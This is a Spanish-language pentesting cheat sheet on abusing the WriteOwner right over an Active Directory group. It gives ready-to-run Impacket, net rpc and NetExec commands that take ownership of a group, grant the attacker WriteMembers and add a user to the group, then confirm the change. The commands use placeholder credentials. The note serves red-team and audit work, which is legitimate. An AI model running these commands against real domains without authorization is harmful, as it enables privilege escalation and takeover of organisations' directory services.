# Abuso ACL 

Tags: #AD #ACL #Linux #Impacket 

## WriteOwner sobre Grupo 

Si tenemos esta ACL sobre un **Group**, podemos **cambiar el propietario del grupo** y posteriormente utilizar ese control para modificar sus permisos.

```bash 
Paso 1:
# Cambiar la propiedad del objeto 
❯ impacket-owneredit -action write -new-owner 'attacker' -target 'Target_Group' domain/ControlledUser:'P@$$w0rd123!'

	# attacker = Usuario al que vas a asignar como nuevo propietario del objeto
	# target = Grupo, usuario, equipo víctima sobre el que se tienen los derechos 
	# ControlledUser & password = Credenciales del usuario que tiene los derechos de 'WriteOwner'
```

```bash 
Paso 2:
# Modificar los permisos y abusar de la propiedad de un objeto de grupo, se puede conceder a uno mismo el permiso 'AddMember'

❯ impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'ControlledUser' -target-dn 'groupDistinguidedName' domain/ControlledUser:'P@$$w0rd123!'

	# ControlledUser = Usuario al que se le va a asignar el permiso dentro del ACL del objeto destino
	# target-dn = Es el 'Distinguished Name' (CN=Management,CN=Users,DC=Domain,DC=Corp)
	# ControlledUser & password = Credenciales del usuario que tiene los derechos de 'WriteOwner'

Notas:
	1. BloodHound muestra el 'Distinguished Name' dandole click al grupo 
```

```bash 
Paso 3:
# Agregar miembros al grupo
❯ net rpc group addmem 'Target_Group' 'TargetUser' -U domain/ControlledUser:'P@$$w0rd123!' -S IP_DC

	# TargetGroup = Grupo víctima sobre el que se tienen los derechos
	# TargetUser = Usuario a añadir 
	# ControlledUser & password = Credenciales del usuario que tiene los derechos de 'WriteOwner'
	# -S = Es la dirección IP 
```

```bash 
Paso 4:
# Confirmar que si se agrego al grupo 
❯ nxc ldap IP_DC -u ControlledUser -p 'P@$$w0rd123!' --groups 
❯ net rpc group members 'Target_Group' -U domain/ControlledUser%'P@$$w0rd123!' -S IP_DC 
```